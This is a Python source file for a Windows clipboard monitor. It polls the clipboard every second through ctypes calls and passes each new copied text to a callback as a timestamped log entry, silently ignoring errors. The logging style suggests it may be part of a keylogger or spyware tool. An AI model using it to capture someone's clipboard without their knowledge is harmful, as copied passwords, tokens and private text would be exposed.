#!/usr/bin/python
# -*- coding: utf-8 -*-
import time
import threading
import ctypes
from ctypes import wintypes
import os

# Windows API constants
CF_TEXT = 1
GHND = 0x0042

class ClipboardMonitor:
    def __init__(self, callback_function):
        self.callback = callback_function
        self.running = False
        self.last_paste = ""
        self.thread = None
        
        # Load User32.dll and Kernel32.dll
        try:
            self.user32 = ctypes.windll.user32
            self.kernel32 = ctypes.windll.kernel32
            
            # Define argument types for strict checking
            self.user32.OpenClipboard.argtypes = [wintypes.HWND]
            self.user32.CloseClipboard.argtypes = []
            self.user32.GetClipboardData.argtypes = [wintypes.UINT]
            self.user32.GetClipboardData.restype = wintypes.HANDLE
            
            self.kernel32.GlobalLock.argtypes = [wintypes.HGLOBAL]
            self.kernel32.GlobalLock.restype = wintypes.LPVOID
            self.kernel32.GlobalUnlock.argtypes = [wintypes.HGLOBAL]
            self.kernel32.GlobalUnlock.restype = wintypes.BOOL
            
            self.has_ctypes = True
        except:
            self.has_ctypes = False

    def get_clipboard_text(self):
        if not self.has_ctypes:
            return ""

        text = ""
        try:
            # Open Clipboard
            if self.user32.OpenClipboard(None):
                try:
                    # Get Handle to Clipboard Data (CF_TEXT for ANSI text)
                    h_global = self.user32.GetClipboardData(CF_TEXT)
                    if h_global:
                        # Lock Global Memory to get pointer
                        p_global = self.kernel32.GlobalLock(h_global)
                        if p_global:
                            try:
                                text = ctypes.c_char_p(p_global).value.decode('latin-1') 
                            except:
                                pass
                            finally:
                                self.kernel32.GlobalUnlock(h_global)
                finally:
                    self.user32.CloseClipboard()
        except:
            pass
            
        return text

    def start(self):
        if not self.has_ctypes and os.name == 'nt':
            return # Should work on Windows, fail otherwise
            
        self.running = True
        self.thread = threading.Thread(target=self._monitor_loop)
        self.thread.daemon = True
        self.thread.start()

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=1)

    def _monitor_loop(self):
        while self.running:
            try:
                current_paste = self.get_clipboard_text()
                if current_paste and current_paste != self.last_paste and current_paste.strip():
                    self.last_paste = current_paste
                    log_entry = f"\n[CLIPBOARD] Copied Data ({time.ctime()}):\n{current_paste}\n====================\n"
                    self.callback(log_entry)
            except Exception:
                pass
            time.sleep(1) # Check every second
